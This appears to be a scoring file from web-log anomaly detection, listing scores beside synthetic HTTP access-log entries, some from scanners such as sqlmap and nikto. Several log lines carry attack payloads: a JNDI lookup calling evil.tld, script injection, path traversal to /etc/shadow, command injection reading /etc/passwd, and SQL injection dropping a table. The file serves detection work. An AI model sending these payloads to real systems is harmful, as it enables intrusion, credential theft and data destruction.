score_content,score_session,score_fused,score_fused_norm,line
95.1199722290039,,95.1199722290039,95.1199722290039,{"remote_addr": "39.2.16.176", "time_local": "11/Jan/2025:09:01:51 -0700", "request": "OPTIONS /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 200, "body_bytes_sent": 6976, "http_referer": "https://example.com/", "http_user_agent": "python-requests/2.31.0"}
3.161728620529175,,3.161728620529175,3.161728620529175,{"remote_addr": "231.189.216.167", "time_local": "11/Jan/2025:09:01:52 -0700", "request": "GET /assets/app.js HTTP/2", "status": 304, "body_bytes_sent": 11903, "http_referer": "https://twitter.com/", "http_user_agent": "python-requests/2.31.0"}
49.67424011230469,,49.67424011230469,49.67424011230469,{"remote_addr": "207.136.133.188", "time_local": "11/Jan/2025:09:01:53 -0700", "request": "DELETE /search?q=phone HTTP/2", "status": 200, "body_bytes_sent": 16819, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
2.291343927383423,,2.291343927383423,2.291343927383423,{"remote_addr": "146.182.77.167", "time_local": "11/Jan/2025:09:01:53 -0700", "request": "GET / HTTP/2", "status": 200, "body_bytes_sent": 2196, "http_referer": "-", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
95.0925521850586,,95.0925521850586,95.0925521850586,{"remote_addr": "214.105.192.222", "time_local": "11/Jan/2025:09:01:54 -0700", "request": "OPTIONS /api/product?id=123 HTTP/2", "status": 200, "body_bytes_sent": 13795, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
4.811373710632324,,4.811373710632324,4.811373710632324,{"remote_addr": "146.58.16.139", "time_local": "11/Jan/2025:09:01:55 -0700", "request": "POST /about HTTP/2", "status": 200, "body_bytes_sent": 8275, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
2.097771167755127,,2.097771167755127,2.097771167755127,{"remote_addr": "44.88.170.126", "time_local": "11/Jan/2025:09:01:56 -0700", "request": "GET /login HTTP/2", "status": 200, "body_bytes_sent": 9927, "http_referer": "https://example.com/", "http_user_agent": "dirb/2.22"}
45.298561096191406,,45.298561096191406,45.298561096191406,{"remote_addr": "237.141.5.209", "time_local": "11/Jan/2025:09:01:56 -0700", "request": "HEAD /cgi-bin/test.cgi HTTP/2", "status": 200, "body_bytes_sent": 11037, "http_referer": "https://twitter.com/", "http_user_agent": "python-requests/2.31.0"}
2.1045029163360596,,2.1045029163360596,2.1045029163360596,{"remote_addr": "87.8.253.20", "time_local": "11/Jan/2025:09:01:57 -0700", "request": "GET /login HTTP/2", "status": 200, "body_bytes_sent": 12110, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
49.84580993652344,,49.84580993652344,49.84580993652344,{"remote_addr": "167.121.52.152", "time_local": "11/Jan/2025:09:01:58 -0700", "request": "DELETE /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/2", "status": 200, "body_bytes_sent": 17439, "http_referer": "-", "http_user_agent": "curl/7.85.0"}
0.2617056667804718,,0.2617056667804718,0.2617056667804718,{"remote_addr": "120.48.249.38", "time_local": "11/Jan/2025:09:01:59 -0700", "request": "GET /assets/app.js HTTP/2", "status": 200, "body_bytes_sent": 17442, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
35.486717224121094,,35.486717224121094,35.486717224121094,{"remote_addr": "119.149.174.112", "time_local": "11/Jan/2025:09:02:00 -0700", "request": "PUT /search?q=router HTTP/2", "status": 200, "body_bytes_sent": 7297, "http_referer": "https://twitter.com/", "http_user_agent": "nikto/2.5.0"}
27.06048583984375,,27.06048583984375,27.06048583984375,{"remote_addr": "236.224.251.54", "time_local": "11/Jan/2025:09:02:01 -0700", "request": "POST /search?q=laptop HTTP/2", "status": 200, "body_bytes_sent": 7714, "http_referer": "https://example.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
104.01898956298828,,104.01898956298828,104.01898956298828,{"remote_addr": "98.159.247.224", "time_local": "11/Jan/2025:09:02:01 -0700", "request": "TRACE /login HTTP/2", "status": 200, "body_bytes_sent": 6190, "http_referer": "https://example.com/", "http_user_agent": "dirb/2.22"}
7.678711414337158,,7.678711414337158,7.678711414337158,{"remote_addr": "94.187.2.181", "time_local": "11/Jan/2025:09:02:02 -0700", "request": "POST /contact HTTP/2", "status": 304, "body_bytes_sent": 17150, "http_referer": "https://twitter.com/", "http_user_agent": "python-requests/2.31.0"}
50.0985221862793,,50.0985221862793,50.0985221862793,{"remote_addr": "68.54.200.73", "time_local": "11/Jan/2025:09:02:03 -0700", "request": "HEAD /logout HTTP/2", "status": 304, "body_bytes_sent": 8366, "http_referer": "https://twitter.com/", "http_user_agent": "python-requests/2.31.0"}
11.45028018951416,,11.45028018951416,11.45028018951416,{"remote_addr": "247.209.136.81", "time_local": "11/Jan/2025:09:02:03 -0700", "request": "PUT /index.html HTTP/2", "status": 200, "body_bytes_sent": 3654, "http_referer": "https://twitter.com/", "http_user_agent": "python-requests/2.31.0"}
47.09737777709961,,47.09737777709961,47.09737777709961,{"remote_addr": "99.162.66.26", "time_local": "11/Jan/2025:09:02:04 -0700", "request": "HEAD /dashboard HTTP/2", "status": 200, "body_bytes_sent": 15573, "http_referer": "https://example.com/", "http_user_agent": "curl/7.85.0"}
4.81297492980957,,4.81297492980957,4.81297492980957,{"remote_addr": "59.120.59.209", "time_local": "11/Jan/2025:09:02:04 -0700", "request": "POST /about HTTP/2", "status": 200, "body_bytes_sent": 8762, "http_referer": "https://twitter.com/", "http_user_agent": "nikto/2.5.0"}
49.638755798339844,,49.638755798339844,49.638755798339844,{"remote_addr": "199.52.38.3", "time_local": "11/Jan/2025:09:02:05 -0700", "request": "DELETE /search?q=router HTTP/2", "status": 200, "body_bytes_sent": 12247, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
69.65070343017578,,69.65070343017578,69.65070343017578,{"remote_addr": "212.113.107.116", "time_local": "11/Jan/2025:09:02:06 -0700", "request": "HEAD /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/2", "status": 200, "body_bytes_sent": 4192, "http_referer": "https://twitter.com/", "http_user_agent": "nikto/2.5.0"}
0.5297046899795532,,0.5297046899795532,0.5297046899795532,{"remote_addr": "46.125.92.133", "time_local": "11/Jan/2025:09:02:07 -0700", "request": "GET /.env HTTP/2", "status": 201, "body_bytes_sent": 8623, "http_referer": "https://example.com/", "http_user_agent": "dirb/2.22"}
24.359895706176758,,24.359895706176758,24.359895706176758,{"remote_addr": "127.35.170.85", "time_local": "11/Jan/2025:09:02:08 -0700", "request": "GET /search?q=camera HTTP/2", "status": 204, "body_bytes_sent": 16126, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "nikto/2.5.0"}
29.962438583374023,,29.962438583374023,29.962438583374023,{"remote_addr": "204.239.16.15", "time_local": "11/Jan/2025:09:02:08 -0700", "request": "POST /search?q=laptop HTTP/2", "status": 304, "body_bytes_sent": 3315, "http_referer": "https://twitter.com/", "http_user_agent": "nikto/2.5.0"}
35.5300407409668,,35.5300407409668,35.5300407409668,{"remote_addr": "188.63.211.227", "time_local": "11/Jan/2025:09:02:09 -0700", "request": "PUT /api/product?id=123 HTTP/2", "status": 200, "body_bytes_sent": 5055, "http_referer": "-", "http_user_agent": "dirb/2.22"}
30234.48828125,,30234.48828125,30234.48828125,{"remote_addr": "105.193.195.149", "time_local": "11/Jan/2025:09:02:09 -0700", "request": "OPTIONS /search?q=monitor HTTP/2", "status": 400, "body_bytes_sent": 886, "http_referer": "https://twitter.com/", "http_user_agent": "dirb/2.22"}
1.9345396757125854,,1.9345396757125854,1.9345396757125854,{"remote_addr": "168.202.249.122", "time_local": "11/Jan/2025:09:02:10 -0700", "request": "GET /phpmyadmin HTTP/2", "status": 200, "body_bytes_sent": 13042, "http_referer": "https://www.google.com/", "http_user_agent": "python-requests/2.31.0"}
103.97317504882812,,103.97317504882812,103.97317504882812,{"remote_addr": "54.121.139.185", "time_local": "11/Jan/2025:09:02:11 -0700", "request": "TRACE /contact HTTP/2", "status": 200, "body_bytes_sent": 15511, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
47.030574798583984,,47.030574798583984,47.030574798583984,{"remote_addr": "243.128.152.12", "time_local": "11/Jan/2025:09:02:11 -0700", "request": "HEAD /phpmyadmin HTTP/2", "status": 200, "body_bytes_sent": 3921, "http_referer": "https://www.google.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
103.9576187133789,,103.9576187133789,103.9576187133789,{"remote_addr": "139.112.26.219", "time_local": "11/Jan/2025:09:02:12 -0700", "request": "TRACE /profile HTTP/2", "status": 200, "body_bytes_sent": 10147, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "nikto/2.5.0"}
70.99058532714844,,70.99058532714844,70.99058532714844,{"remote_addr": "225.128.177.215", "time_local": "11/Jan/2025:09:02:12 -0700", "request": "OPTIONS /index.html HTTP/2", "status": 200, "body_bytes_sent": 8022, "http_referer": "https://www.google.com/", "http_user_agent": "nikto/2.5.0"}
35.49762725830078,,35.49762725830078,35.49762725830078,{"remote_addr": "197.204.162.38", "time_local": "11/Jan/2025:09:02:13 -0700", "request": "PUT /search?q=phone HTTP/2", "status": 204, "body_bytes_sent": 5809, "http_referer": "https://twitter.com/", "http_user_agent": "dirb/2.22"}
35.55747604370117,,35.55747604370117,35.55747604370117,{"remote_addr": "20.122.182.168", "time_local": "11/Jan/2025:09:02:13 -0700", "request": "PUT /api/product?id=123 HTTP/2", "status": 204, "body_bytes_sent": 16228, "http_referer": "https://www.google.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
30166.787109375,,30166.787109375,30166.787109375,{"remote_addr": "182.45.202.185", "time_local": "11/Jan/2025:09:02:14 -0700", "request": "DELETE /api/products HTTP/2", "status": 401, "body_bytes_sent": 597, "http_referer": "https://www.google.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
104.00048065185547,,104.00048065185547,104.00048065185547,{"remote_addr": "96.25.104.161", "time_local": "11/Jan/2025:09:02:15 -0700", "request": "TRACE /logout HTTP/2", "status": 200, "body_bytes_sent": 12321, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
4.802112102508545,,4.802112102508545,4.802112102508545,{"remote_addr": "119.219.147.138", "time_local": "11/Jan/2025:09:02:16 -0700", "request": "POST /about HTTP/2", "status": 200, "body_bytes_sent": 5490, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
30153.099609375,,30153.099609375,30153.099609375,{"remote_addr": "78.133.152.155", "time_local": "11/Jan/2025:09:02:16 -0700", "request": "PUT / HTTP/2", "status": 404, "body_bytes_sent": 877, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "python-requests/2.31.0"}
45.400020599365234,,45.400020599365234,45.400020599365234,{"remote_addr": "186.163.11.66", "time_local": "11/Jan/2025:09:02:17 -0700", "request": "HEAD /wp-login.php HTTP/2", "status": 200, "body_bytes_sent": 13348, "http_referer": "https://twitter.com/", "http_user_agent": "nikto/2.5.0"}
102.25128936767578,,102.25128936767578,102.25128936767578,{"remote_addr": "120.109.50.112", "time_local": "11/Jan/2025:09:02:18 -0700", "request": "TRACE /index.html HTTP/2", "status": 200, "body_bytes_sent": 9068, "http_referer": "https://twitter.com/", "http_user_agent": "nikto/2.5.0"}
4.880904197692871,,4.880904197692871,4.880904197692871,{"remote_addr": "235.188.77.245", "time_local": "11/Jan/2025:09:02:18 -0700", "request": "GET /profile HTTP/2", "status": 301, "body_bytes_sent": 10393, "http_referer": "https://www.google.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
47.127193450927734,,47.127193450927734,47.127193450927734,{"remote_addr": "179.64.186.7", "time_local": "11/Jan/2025:09:02:19 -0700", "request": "HEAD /contact HTTP/2", "status": 200, "body_bytes_sent": 2395, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
0.20133548974990845,,0.20133548974990845,0.20133548974990845,{"remote_addr": "82.74.172.21", "time_local": "11/Jan/2025:09:02:19 -0700", "request": "GET /assets/app.css HTTP/2", "status": 200, "body_bytes_sent": 5543, "http_referer": "https://www.google.com/", "http_user_agent": "curl/7.85.0"}
1.8406093120574951,,1.8406093120574951,1.8406093120574951,{"remote_addr": "205.126.90.190", "time_local": "11/Jan/2025:09:02:20 -0700", "request": "GET /server-status HTTP/2", "status": 200, "body_bytes_sent": 9608, "http_referer": "https://twitter.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
49.96759033203125,,49.96759033203125,49.96759033203125,{"remote_addr": "63.192.113.149", "time_local": "11/Jan/2025:09:02:21 -0700", "request": "HEAD /dashboard HTTP/2", "status": 302, "body_bytes_sent": 12399, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
0.19599975645542145,,0.19599975645542145,0.19599975645542145,{"remote_addr": "238.29.96.92", "time_local": "11/Jan/2025:09:02:22 -0700", "request": "GET /assets/app.css HTTP/2", "status": 200, "body_bytes_sent": 1743, "http_referer": "-", "http_user_agent": "nikto/2.5.0"}
13.2259521484375,,13.2259521484375,13.2259521484375,{"remote_addr": "30.30.1.103", "time_local": "11/Jan/2025:09:02:22 -0700", "request": "PUT /about HTTP/2", "status": 200, "body_bytes_sent": 4263, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
47.131736755371094,,47.131736755371094,47.131736755371094,{"remote_addr": "190.148.252.154", "time_local": "11/Jan/2025:09:02:23 -0700", "request": "HEAD /contact HTTP/2", "status": 200, "body_bytes_sent": 4820, "http_referer": "https://twitter.com/", "http_user_agent": "python-requests/2.31.0"}
95.02214813232422,,95.02214813232422,95.02214813232422,{"remote_addr": "79.100.12.205", "time_local": "11/Jan/2025:09:02:23 -0700", "request": "OPTIONS /search?q=router HTTP/2", "status": 204, "body_bytes_sent": 9574, "http_referer": "-", "http_user_agent": "nikto/2.5.0"}
47.0607795715332,,47.0607795715332,47.0607795715332,{"remote_addr": "9.156.203.140", "time_local": "11/Jan/2025:09:02:24 -0700", "request": "HEAD /phpmyadmin HTTP/2", "status": 200, "body_bytes_sent": 13620, "http_referer": "https://twitter.com/", "http_user_agent": "python-requests/2.31.0"}
11034.0830078125,,11034.0830078125,11034.0830078125,{"remote_addr": "37.114.55.228", "time_local": "11/Jan/2025:09:02:24 -0700", "request": "POST /api/products HTTP/2", "status": 500, "body_bytes_sent": 1019, "http_referer": "https://example.com/", "http_user_agent": "dirb/2.22"}
126.4883041381836,,126.4883041381836,126.4883041381836,{"remote_addr": "24.168.60.45", "time_local": "11/Jan/2025:09:02:25 -0700", "request": "TRACE /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/2", "status": 200, "body_bytes_sent": 10918, "http_referer": "-", "http_user_agent": "nikto/2.5.0"}
126.27804565429688,,126.27804565429688,126.27804565429688,{"remote_addr": "99.66.73.250", "time_local": "11/Jan/2025:09:02:26 -0700", "request": "TRACE /search?q=laptop HTTP/2", "status": 200, "body_bytes_sent": 5551, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
95.00296020507812,,95.00296020507812,95.00296020507812,{"remote_addr": "166.218.117.180", "time_local": "11/Jan/2025:09:02:27 -0700", "request": "OPTIONS /search?q=monitor HTTP/2", "status": 200, "body_bytes_sent": 8042, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
72.63114929199219,,72.63114929199219,72.63114929199219,{"remote_addr": "8.2.217.85", "time_local": "11/Jan/2025:09:02:28 -0700", "request": "OPTIONS /api/products HTTP/2", "status": 200, "body_bytes_sent": 2573, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
27.3510684967041,,27.3510684967041,27.3510684967041,{"remote_addr": "76.253.83.134", "time_local": "11/Jan/2025:09:02:28 -0700", "request": "DELETE /logout HTTP/2", "status": 200, "body_bytes_sent": 13019, "http_referer": "https://twitter.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
27.053686141967773,,27.053686141967773,27.053686141967773,{"remote_addr": "95.156.170.54", "time_local": "11/Jan/2025:09:02:28 -0700", "request": "POST /search?q=laptop HTTP/2", "status": 200, "body_bytes_sent": 1144, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
30139.8828125,,30139.8828125,30139.8828125,{"remote_addr": "43.180.206.78", "time_local": "11/Jan/2025:09:02:29 -0700", "request": "GET /assets/app.js HTTP/2", "status": 404, "body_bytes_sent": 1330, "http_referer": "https://www.google.com/", "http_user_agent": "curl/7.85.0"}
2.0229127407073975,,2.0229127407073975,2.0229127407073975,{"remote_addr": "204.15.162.39", "time_local": "11/Jan/2025:09:02:29 -0700", "request": "GET /contact HTTP/2", "status": 200, "body_bytes_sent": 9699, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
13.187585830688477,,13.187585830688477,13.187585830688477,{"remote_addr": "82.122.219.183", "time_local": "11/Jan/2025:09:02:30 -0700", "request": "PUT /profile HTTP/2", "status": 200, "body_bytes_sent": 15885, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
3.2413365840911865,,3.2413365840911865,3.2413365840911865,{"remote_addr": "116.205.80.168", "time_local": "11/Jan/2025:09:02:31 -0700", "request": "POST /.env HTTP/2", "status": 200, "body_bytes_sent": 1118, "http_referer": "https://example.com/", "http_user_agent": "python-requests/2.31.0"}
106.86209106445312,,106.86209106445312,106.86209106445312,{"remote_addr": "50.53.75.50", "time_local": "11/Jan/2025:09:02:32 -0700", "request": "TRACE /logout HTTP/2", "status": 301, "body_bytes_sent": 10746, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
95.10910034179688,,95.10910034179688,95.10910034179688,{"remote_addr": "31.31.236.208", "time_local": "11/Jan/2025:09:02:33 -0700", "request": "OPTIONS /search?q=ssd HTTP/2", "status": 200, "body_bytes_sent": 11727, "http_referer": "https://www.google.com/", "http_user_agent": "nikto/2.5.0"}
4.57050895690918,,4.57050895690918,4.57050895690918,{"remote_addr": "101.169.184.209", "time_local": "11/Jan/2025:09:02:33 -0700", "request": "POST /server-status HTTP/2", "status": 200, "body_bytes_sent": 13194, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "python-requests/2.31.0"}
103.75963592529297,,103.75963592529297,103.75963592529297,{"remote_addr": "218.196.134.245", "time_local": "11/Jan/2025:09:02:34 -0700", "request": "TRACE /server-status HTTP/2", "status": 200, "body_bytes_sent": 1262, "http_referer": "https://example.com/", "http_user_agent": "python-requests/2.31.0"}
4.837845325469971,,4.837845325469971,4.837845325469971,{"remote_addr": "177.9.238.231", "time_local": "11/Jan/2025:09:02:35 -0700", "request": "GET /api/products HTTP/2", "status": 301, "body_bytes_sent": 11660, "http_referer": "https://example.com/", "http_user_agent": "nikto/2.5.0"}
2.3307530879974365,,2.3307530879974365,2.3307530879974365,{"remote_addr": "62.235.103.70", "time_local": "11/Jan/2025:09:02:36 -0700", "request": "GET / HTTP/2", "status": 200, "body_bytes_sent": 16188, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
27.109235763549805,,27.109235763549805,27.109235763549805,{"remote_addr": "122.196.51.100", "time_local": "11/Jan/2025:09:02:36 -0700", "request": "POST /api/backup?file=../../../../etc/shadow HTTP/2", "status": 200, "body_bytes_sent": 875, "http_referer": "https://twitter.com/", "http_user_agent": "dirb/2.22"}
50.090274810791016,,50.090274810791016,50.090274810791016,{"remote_addr": "25.159.2.37", "time_local": "11/Jan/2025:09:02:37 -0700", "request": "HEAD /login HTTP/2", "status": 301, "body_bytes_sent": 12676, "http_referer": "https://twitter.com/", "http_user_agent": "nikto/2.5.0"}
0.2534119188785553,,0.2534119188785553,0.2534119188785553,{"remote_addr": "4.96.158.84", "time_local": "11/Jan/2025:09:02:39 -0700", "request": "GET /assets/app.css HTTP/2", "status": 200, "body_bytes_sent": 266, "http_referer": "https://twitter.com/", "http_user_agent": "curl/7.85.0"}
49.63841247558594,,49.63841247558594,49.63841247558594,{"remote_addr": "179.237.107.79", "time_local": "11/Jan/2025:09:02:39 -0700", "request": "DELETE /search?q=laptop HTTP/2", "status": 200, "body_bytes_sent": 12131, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
3.150575876235962,,3.150575876235962,3.150575876235962,{"remote_addr": "102.250.69.124", "time_local": "11/Jan/2025:09:02:40 -0700", "request": "GET /.git/config HTTP/2", "status": 302, "body_bytes_sent": 4023, "http_referer": "https://www.google.com/", "http_user_agent": "python-requests/2.31.0"}
30175.21875,,30175.21875,30175.21875,{"remote_addr": "220.49.155.98", "time_local": "11/Jan/2025:09:02:40 -0700", "request": "PUT /search?q=ssd HTTP/2", "status": 404, "body_bytes_sent": 710, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
4.762359142303467,,4.762359142303467,4.762359142303467,{"remote_addr": "210.158.155.13", "time_local": "11/Jan/2025:09:02:41 -0700", "request": "POST /profile HTTP/2", "status": 200, "body_bytes_sent": 16777, "http_referer": "-", "http_user_agent": "dirb/2.22"}
30.13367462158203,,30.13367462158203,30.13367462158203,{"remote_addr": "55.13.125.90", "time_local": "11/Jan/2025:09:02:42 -0700", "request": "DELETE /dashboard HTTP/2", "status": 304, "body_bytes_sent": 3220, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
3.0277442932128906,,3.0277442932128906,3.0277442932128906,{"remote_addr": "191.43.194.170", "time_local": "11/Jan/2025:09:02:43 -0700", "request": "POST /index.html HTTP/2", "status": 200, "body_bytes_sent": 5409, "http_referer": "https://www.google.com/", "http_user_agent": "curl/7.85.0"}
27.159631729125977,,27.159631729125977,27.159631729125977,{"remote_addr": "31.67.246.156", "time_local": "11/Jan/2025:09:02:44 -0700", "request": "POST /search?q=ssd HTTP/2", "status": 201, "body_bytes_sent": 17114, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "dirb/2.22"}
30175.11328125,,30175.11328125,30175.11328125,{"remote_addr": "56.19.61.14", "time_local": "11/Jan/2025:09:02:45 -0700", "request": "PUT /search?q=monitor HTTP/2", "status": 404, "body_bytes_sent": 1275, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
49.6251335144043,,49.6251335144043,49.6251335144043,{"remote_addr": "60.100.221.193", "time_local": "11/Jan/2025:09:02:45 -0700", "request": "DELETE /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/2", "status": 200, "body_bytes_sent": 16866, "http_referer": "https://example.com/", "http_user_agent": "dirb/2.22"}
35.5281982421875,,35.5281982421875,35.5281982421875,{"remote_addr": "2.202.77.254", "time_local": "11/Jan/2025:09:02:46 -0700", "request": "PUT /api/product?id=123 HTTP/2", "status": 200, "body_bytes_sent": 4448, "http_referer": "https://twitter.com/", "http_user_agent": "dirb/2.22"}
27.136308670043945,,27.136308670043945,27.136308670043945,{"remote_addr": "72.9.66.15", "time_local": "11/Jan/2025:09:02:46 -0700", "request": "POST /api/backup?file=../../../../etc/shadow HTTP/2", "status": 200, "body_bytes_sent": 16433, "http_referer": "https://www.google.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
24.3680362701416,,24.3680362701416,24.3680362701416,{"remote_addr": "64.143.224.98", "time_local": "11/Jan/2025:09:02:47 -0700", "request": "GET /search?q=camera HTTP/2", "status": 200, "body_bytes_sent": 16599, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
27.370893478393555,,27.370893478393555,27.370893478393555,{"remote_addr": "149.35.86.13", "time_local": "11/Jan/2025:09:02:48 -0700", "request": "DELETE /login HTTP/2", "status": 200, "body_bytes_sent": 904, "http_referer": "https://twitter.com/", "http_user_agent": "dirb/2.22"}
95.08935546875,,95.08935546875,95.08935546875,{"remote_addr": "82.222.75.57", "time_local": "11/Jan/2025:09:02:48 -0700", "request": "OPTIONS /api/user?id=1;DROP TABLE users HTTP/2", "status": 200, "body_bytes_sent": 511, "http_referer": "https://example.com/", "http_user_agent": "python-requests/2.31.0"}
126.27404022216797,,126.27404022216797,126.27404022216797,{"remote_addr": "117.132.125.160", "time_local": "11/Jan/2025:09:02:49 -0700", "request": "TRACE /search?q=router HTTP/2", "status": 200, "body_bytes_sent": 4246, "http_referer": "https://www.google.com/", "http_user_agent": "python-requests/2.31.0"}
13.181646347045898,,13.181646347045898,13.181646347045898,{"remote_addr": "22.170.247.103", "time_local": "11/Jan/2025:09:02:49 -0700", "request": "PUT /profile HTTP/2", "status": 200, "body_bytes_sent": 13732, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
4.735587120056152,,4.735587120056152,4.735587120056152,{"remote_addr": "177.101.114.4", "time_local": "11/Jan/2025:09:02:49 -0700", "request": "POST /profile HTTP/2", "status": 200, "body_bytes_sent": 7776, "http_referer": "https://example.com/", "http_user_agent": "nikto/2.5.0"}
0.15971161425113678,,0.15971161425113678,0.15971161425113678,{"remote_addr": "200.211.6.42", "time_local": "11/Jan/2025:09:02:50 -0700", "request": "GET /cgi-bin/test.cgi HTTP/2", "status": 200, "body_bytes_sent": 1044, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
49.55580139160156,,49.55580139160156,49.55580139160156,{"remote_addr": "33.209.154.197", "time_local": "11/Jan/2025:09:02:50 -0700", "request": "DELETE /search?q=headphones HTTP/2", "status": 200, "body_bytes_sent": 9433, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
25.46880531311035,,25.46880531311035,25.46880531311035,{"remote_addr": "67.53.52.56", "time_local": "11/Jan/2025:09:02:51 -0700", "request": "DELETE /cgi-bin/test.cgi HTTP/2", "status": 200, "body_bytes_sent": 15270, "http_referer": "https://example.com/", "http_user_agent": "curl/7.85.0"}
4.926223278045654,,4.926223278045654,4.926223278045654,{"remote_addr": "79.167.137.43", "time_local": "11/Jan/2025:09:02:51 -0700", "request": "GET /contact HTTP/2", "status": 304, "body_bytes_sent": 6044, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
